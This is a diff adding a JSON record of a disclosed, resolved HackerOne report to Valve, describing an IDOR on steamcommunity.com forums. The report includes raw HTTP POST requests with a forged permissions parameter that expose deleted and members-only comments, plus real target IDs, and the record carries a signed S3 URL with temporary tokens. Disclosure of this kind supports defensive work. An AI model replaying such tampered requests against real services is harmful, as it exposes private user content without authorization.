@@ -1,0 +1,218 @@
+{
+  "id": 308610,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDg2MTA=",
+  "url": "https://hackerone.com/reports/308610",
+  "title": "Read Access to all comments on unauthorized forums' discussions! IDOR! ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-24T11:10:24.862Z",
+  "submitted_at": "2018-01-24T11:10:24.862Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": true,
+    "username": "ta8ahi",
+    "url": "/ta8ahi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/VcUQbwzkMA3BX1HUnRDQRGEA/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23363,
+    "url": "https://hackerone.com/valve",
+    "handle": "valve",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Valve",
+      "twitter_handle": "",
+      "website": "https://www.valvesoftware.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-05-09T17:38:52.389Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-05-08T10:13:22.620Z",
+  "team_member_agreed_on_going_public_at": "2018-05-09T17:38:52.286Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "hi,\n\nFor a forum's discussion, only ` moderator+ ` ranks are allowed to **view comments which have been deleted** by a ` officer/moderator `. \n\nI have found an issue where a ` member `(who is not allowed to view deleted comments) can get read access to the deleted comments on a forum's discussion.\n\nAlso, a ` non-member ` who ` can't view the discussions belonging to an unauthorized forum `, can **expose the comments** on discussions of such forums. He can get read access to all i.e ` even deleted ` comments on such forums.\n\n\n##Steps to reproduce:\n###First we try to expose deleted comments to a member rank user\n\n* Have a forum with such permissions:\n{F256910}\nSo, here ` members ` can view the discussions belonging to this forum, but aren't allowed to view any deleted comments.\n\nAlso, ` non-members ` **can't even view the discussions.**\n* In the forum, have a discussion, which has some comments, and delete a few of them.\n\n* From ` member ` account, visit the target discussion, ` view-source ` of the page, search for ` forumtopic_ ` where you will find the **GroupId**, **forumId**, **discussion-id** in ` ForumTopic_***GroupID***_***forumID***_***discussionID***  `  format. Note these down.\n* now, with credentials (` cookies/sessionId `) belonging to a ` member ` account, make the following request:\n\n```\nPOST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1\nHost: steamcommunity.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Length: 597\nCookie: ***********member-cookies****\nConnection: close\n\ngidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true\n\n\n\n```\n\nProvide the IDs you noted down as stated in the request. Keep the ` extended_data ` param as it is.\n\n* send the request through\n* in the response search for ` comments_raw `, you will see that even the deleted comments were shown to you.\n\n\n###now Lets attempt to expose comments to a user who is not allowed to view the forum\n\n* Now, with credentials (` cookies/sessionId `) belonging to a ` non-member ` account, make the following request:\n\n```\nPOST /comment/ForumTopic/delete/***GroupID***/***forumID***/ HTTP/1.1\nHost: steamcommunity.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nX-Prototype-Version: 1.7\nContent-Length: 597\nCookie: ***********member-cookies****\nConnection: close\n\ngidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***************&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=***discussionID***&oldestfirst=true&include_raw=true\n\n```\nProvide the same IDs as in the previous request. Or you can try with ` ForumTopic_103582791461362746_1692659135923574526_1692659769940104935 `, these IDs belong to a **Group-->forum** which has view permissions set to ` members-only `.\n\nIn response, search for ` comments_raw  `, you will see all comments were exposed to a user who ` does not even have the permission to view this discussion `.\n\n## Impact\n\n* ` Non-members ` without having the access to ` view a forum ` can get **read access** to all comments including deleted comments on such forum discussions. \n* ` Members ` get **read access** to ` deleted comments ` on forum discussions.\n\nAll these attacks require no user interaction, i.e attacker can ex-filtrate these on his own machine.\n\n\nthanks,\nTabahi",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 256910,
+      "file_name": "initialPermissions.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/256/910/d5fc4d4b8e68386603b5a8d08cbee139f2a607a9/initialPermissions.PNG?response-content-disposition=attachment%3B%20filename%3D%22initialPermissions.PNG%22%3B%20filename%2A%3DUTF-8%27%27initialPermissions.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2MGCBP7N%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T060651Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDg4MuGAI603TNIp3LaOmX0tOUsSfGXGAuawtNU8hBzJAiEAu7bko8qMWI20udxCApr12GcYLkLqP%2FXskF7ofQJKgbwqsgUIfxADGgwwMTM2MTkyNzQ4NDkiDK4gx%2F5FVHzJ731ZXyqPBSSDoBJo0MG6cOYHjcCNOg%2FC%2BnfhlcCY0lh%2BrFxbUo578TmeYrNFbt7gGo5cbFOETQc%2FYZCtGJSCHdfLfqBLI%2Fl7XSQneMH4dYTqo1uN9zYUNT8SSkaeBzTorLT07JMEveAu5B9yu5zGPpqRLXN2lipuPwenf0wU5K48hUG4RcKfWncWUm0ztc8GwO2mle2%2FoWATir%2ByF1qZ2R00Vs2DE5RSOy2S%2FyiOPoPXRFXJIu8HJ1DBX%2FCuEy%2B%2BlsZFWllLZgqYpFKvbIM1HRl%2BWU1R2CvUKR9W0V9HXE7m94CmBVn%2FK5fwWx96CKbSF2mEx%2FP8rvvVSUsYbCMDTdQtARkYtlAxd1zDQRuQnNePPiX5g8DGTooDXWIt6v6qTqmPwNFrJ1hkYYmmixGhmw9OlcKzessaMeWheiJQ08A1Tt0uiAiijuVm9njUWDXDAlKpjD05sTxpg5L4sQVI5Vp0Gcy2An5hZmchDuxegmlZ0ZFyMv06L4TKSLdp2f%2FSecsp1D2NG%2Bt40YkMVpzTVcJ%2BczCfQOUUknJGOJ4W%2FWjo6orOHwatAsw7VPKuuosWvBfRewoQfIii4R38xB47UxumN2IZacQQjQofmmAo8OmgnJ6hwyNVjnpUUhVilhqy0k4Oa0U1DM4G8Ic0in29YUGYGJpf0G7AN0IqJo5A%2BlK4rbf2aKavFCWuN3jQ7vO1qYg2jacUeSOhC76jua72pZ2ZiYzV4w81uhEycjRusRYtWbq0PTZyuRLxLPhOaD8C0J5yXaskcp%2B3pnFCTy42by3SSQRNT5gi4LbExZlrGrpzTkdX4xTOTpPRt0XRUWBMJrNHA%2BfCTtKKZJRX6XnjcqM9qCZmAi6zSgBW2BMNyDmyGHF%2FpwAwj8K30gY6sQE1mr6XcRbnGpg0jQayWbCaCpEJpPEV0R9W83YEe1JGBDTsQSet%2B0xJFpkyPeennPb%2BrKmlS43yHzclwG6SQwm%2FUrLo0R%2BkEPPiwkEKZZFiQpVywSeQP9oerZlFzYBM3edIP6Bl2w6UOxeSgkLrMRGKm07z6zH2C5B2yk225jNlJlPXatk1%2Fz%2BaiXyNxge4LfjLJ%2BXvmgL5RV%2FSU2wASU3JrnLlNMWz31KJx3NfWQwryrk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2bab00c18349fc284f46088949e655d06eb104a9fa3d40b9d8a676887c901b29",
+      "file_size": 9436,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 32,
+  "voters": [
+    "wargsec",
+    "jokebookservice1",
+    "0x800700e1",
+    "sourc7",
+    "bull",
+    "muon4",
+    "dnelsaka",
+    "bl4de",
+    "spam404",
+    "sudi",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 4.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2430,
+    "asset_type": "URL",
+    "asset_identifier": "steamcommunity.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "308610",
+  "votes": 32,
+  "latest_disclosable_activity_at": "2018-05-09T17:38:52.426Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:06:52.143691",
+    "source": "https://hackerone.com/reports/308610.json",
+    "report_id": 308610
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDg2MTA=",
+    "databaseId": "308610",
+    "title": "Read Access to all comments on unauthorized forums' discussions! IDOR! ",
+    "url": "https://hackerone.com/reports/308610",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2018-05-09T17:38:52.389Z",
+    "created_at": "2018-01-24T11:10:24.862Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU1",
+      "name": "Insecure Direct Object Reference (IDOR)",
+      "external_id": "cwe-639"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 4.3
+    },
+    "reporter": {
+      "username": "ta8ahi"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzMzYz",
+      "handle": "valve",
+      "name": "Valve",
+      "url": "https://hackerone.com/valve",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS83MDUwNw==",
+            "amount": "500.00",
+            "awarded_amount": "500.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2018-01-26T17:13:39.443Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzMwODYxMA==",
+    "_id": "308610",
+    "disclosed": true,
+    "votes": 32,
+    "latest_disclosable_activity_at": "2018-05-09T17:38:52.426Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDg2MTA=",
+      "databaseId": "308610",
+      "title": "Read Access to all comments on unauthorized forums' discussions! IDOR! ",
+      "url": "https://hackerone.com/reports/308610",
+      "disclosed_at": "2018-05-09T17:38:52.389Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzMzYz",
+      "handle": "valve",
+      "name": "Valve",
+      "url": "https://hackerone.com/valve",
+      "currency": "usd"
+    }
+  }
+}
